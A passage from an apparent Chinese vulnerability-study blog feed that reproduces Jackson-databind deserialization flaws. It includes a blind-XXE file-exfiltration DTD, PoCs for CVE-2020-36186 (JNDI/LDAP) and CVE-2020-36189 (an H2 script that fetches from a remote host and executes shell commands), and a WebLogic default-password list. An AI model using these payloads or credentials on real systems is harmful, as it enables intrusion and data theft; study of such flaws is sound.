class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.jdom/jdom2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写poc.xml<br>该XXE属于Blind XXE，我们构造以下恶意xml代码，它会去调用位于我们的攻击主机上(这里以本地启动的Http服务模拟)的外部dtd文件(不在同一个文件写入要读取的文件主要是为了避免参数实体引用时发生的错误）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///g:/json.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:4444/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send; </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ppp</span> <span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1/%file;'&gt;"</span>&gt;</span></span><br><span class="line">%ppp;</span><br></pre></td></tr></table></figure><p>起一个web服务，端口为4444，将以上两个xml文件放入其中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444</span><br></pre></td></tr></table></figure><p>再起一个web服务，端口为80，接受盲打返回的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String payload = <span class="string">"[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1:4444/poc.xml\"]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞原理可看此文章：<a href="https://xz.aliyun.com/t/7820" target="_blank" rel="noopener">Jackson JDOM XSLTransformer Gadget浅析</a>    </p><h1 id="jackson-databind-RCE-CVE-2020-36186"><a href="#jackson-databind-RCE-CVE-2020-36186" class="headerlink" title="jackson-databind RCE(CVE-2020-36186)"></a>jackson-databind RCE(CVE-2020-36186)</h1><p>影响范围    </p><ul><li>Jackson-databind &lt; 2.9.10.7</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li><li>使用了commons-dbcp第三方依赖库</li></ul><p>漏洞概述<br>org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。</p><p>漏洞复现<br>pom.xml如下：     </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/tomcat/naming-factory-dbcp --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>naming-factory-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.5.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开启ldap服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:4444&#x2F;#Exploit 1389</span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="keyword">false</span>);</span><br><span class="line">        String json = <span class="string">"[\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\", &#123;\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"&#125;]"</span>;</span><br><span class="line">        Object obj = mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        mapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Jackson-databind-SSRF-amp-RCE-CVE-2020-36189"><a href="#Jackson-databind-SSRF-amp-RCE-CVE-2020-36189" class="headerlink" title="Jackson-databind SSRF&amp;RCE(CVE-2020-36189)"></a>Jackson-databind SSRF&amp;RCE(CVE-2020-36189)</h1><p>影响范围   </p><ul><li>Jackson-databind &lt; 2.9.10.7</li></ul><p>利用条件   </p><ul><li>开启enableDefaultTyping()</li><li>使用了com.h2database\com.newrelic.agent.java第三方依赖库</li></ul><p>漏洞概述<br>com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成SSRF&amp;RCE。</p><p>漏洞复现<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.newrelic.agent.java/newrelic-agent --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.newrelic.agent.java<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>newrelic-agent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SSRF   </p><p>POC  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="keyword">false</span>);</span><br><span class="line">        String json = <span class="string">"[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://pxrrvz.dnslog.cn/'\"&#125;]"</span>;</span><br><span class="line">        Object obj = mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        mapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RCE </p><p>web服务放入 exec.sql文件<br>exec.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        return s.hasNext() ? s.next() : "";  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'calc.exe'</span>)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="keyword">false</span>);</span><br><span class="line">        String json = <span class="string">"[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:4444/exec.sql'\"&#125;]"</span>;</span><br><span class="line">        Object obj = mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        mapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Jackson-databind-SSRF"><a href="#Jackson-databind-SSRF" class="headerlink" title="Jackson-databind SSRF"></a>Jackson-databind SSRF</h1><p>影响范围  </p><ul><li>jackson-databind before 2.9.10.3</li><li>jackson-databind before 2.10.2</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li></ul><p>漏洞概述<br>漏洞类javax.swing.JEditorPane来源于JDK不需要依赖任何jar包，该类在jackson-databind进行反序列化时可造成SSRF<br><a href="https://xz.aliyun.com/t/8011" target="_blank" rel="noopener">Jackson-databind SSRF浅析</a>  </p><h1 id="官方新规"><a href="#官方新规" class="headerlink" title="官方新规"></a>官方新规</h1><p>2020年12月30号，Jackson-databind官方表明由于之前对于黑名单更新的补丁过于频繁而且有大量的绕过是的版本的更新迭代过于频繁，加上申请CVE的流程使得整个维护变得更加繁琐，所以决定从2020年12月31号发布最后一个2.9.10.8版本之后将不再对此黑名单进行维护(除非有极其严重的问题发生)，同时也不再给相关白帽子申请相关CVE编号，但是会继续接受有关Jackson-databind的黑名单类相关安全报告，更多细节可以参考以下连接：</p><p><a href="https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria" target="_blank" rel="noopener">https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria</a></p><p>参考文章：</p><p><a href="https://vulhub.org/#/environments/jackson/CVE-2017-7525/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jackson/CVE-2017-7525/</a><br><a href="https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/" target="_blank" rel="noopener">https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/</a><br><a href="https://xz.aliyun.com/t/8012" target="_blank" rel="noopener">Jackson-databind的几个CVE</a><br><a href="http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">Jackson 反序列化汇总</a><br><a href="http://pirogue.org/2018/01/12/jackson-databind-rce/" target="_blank" rel="noopener">Jackson反序列化远程代码执行漏洞</a><br><a href="https://xz.aliyun.com/t/8012" target="_blank" rel="noopener">Jackson-databind的几个CVE</a><br><a href="https://xz.aliyun.com/t/7820" target="_blank" rel="noopener">Jackson JDOM XSLTransformer Gadget浅析</a><br><a href="https://xz.aliyun.com/t/9331" target="_blank" rel="noopener">Jackson-databind漏洞两则分析</a><br><a href="https://xz.aliyun.com/t/8011" target="_blank" rel="noopener">Jackson-databind SSRF浅析</a></p><p>Jackson-databind 反序列化漏洞分析 (CVE-2020-8840): <a href="https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/#CVE-2020-8840" target="_blank" rel="noopener">https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/#CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Weblogic 漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/db67dfce.html"/>
    <id>https://blog.cfyqy.com/article/db67dfce.html</id>
    <published>2021-03-31T15:11:56.000Z</published>
    <updated>2021-04-13T15:38:50.374Z</updated>
    
    <content type="html"><![CDATA[<p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><a id="more"></a><p><img src="../../images/java/weblogic/1.png" alt=""></p><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>默认端口：7001 、7002  </p><p>常见默认口令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户名：system          密码：password</span><br><span class="line">用户名：weblogic       密码：weblogic </span><br><span class="line">用户名：admin           密码：security</span><br><span class="line">用户名：portadmin     密码：portadmin</span><br><span class="line">用户名：joe                密码：password</span><br><span class="line">用户名：mary             密码：password</span><br><span class="line">用户名：system          密码：security</span><br><span class="line">用户名：system          密码：system</span><br><span class="line">用户名：wlcsystem      密码：wlcsystem</span><br><span class="line">用户名：wlpisystem     密码：wlpisystem</span><br><span class="line">用户名：guest             密码：guest</span><br></pre></td></tr></table></figure><p>常见的Weblogic版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">WebLogic Server 14c(14.1.1.0.0)-2020年4月3日</span><br><span class="line">WebLogic Server 12c(12.1.1) - 2012年3月6日</span><br><span class="line">WebLogic Server 12c(12.0) - 2011年12月1日</span><br><span class="line">WebLogic Server 11gR1 PS5 (10.3.6) - 2012年2月23日</span><br><span class="line">WebLogic Server 11gR1 PS4 (10.3.5) - 2011年5月6日</span><br><span class="line">WebLogic Server 11gR1 PS3 (10.3.4) - 2011年1月15日</span><br><span class="line">WebLogic Server 11gR1 PS2 (10.3.3) - 2010年四月</span><br><span class="line">WebLogic Server 11gR1 PS1 (10.3.2) - 2009年11月</span><br><span class="line">WebLogic Server 11g (10.3.1) - 2009年7月</span><br><span class="line">WebLogic Server 10.3 - 2008年8月（J2EE6支持）</span><br><span class="line">WebLogic Server 10.0 - 2007年3月（J2EE5支持）</span><br><span class="line">WebLogic Server 9.2.4 - 2010年7月22（主要提升管理和运行管理的功能）</span><br><span class="line">WebLogic Server 9.1</span><br><span class="line">WebLogic Server 9.0 - 【Diablo】 2006年11月</span><br><span class="line">WebLogic Server 8.1 －2003年7月发行到2004年8月为成熟版本，也已不再支持</span><br><span class="line">WebLogic Server 7.0 －2002年6月发行但是BEA公司推荐放弃使用。</span><br><span class="line">WebLogic Server 6.1 - 从November 2006不再支持</span><br><span class="line">WebLogic Server 6.0 - 2001年3月,从April 2003不再支持</span><br><span class="line">WebLogic Server 5.1 - (代码名: Denali) 第一个支持热部署技术的版本(通过命令行)</span><br><span class="line">WebLogic Server 4.0 - 1999年</span><br><span class="line">WebLogic Tengah 3.1 - 1998年6月</span><br><span class="line">WebLogic Tengah 3.0.1 - 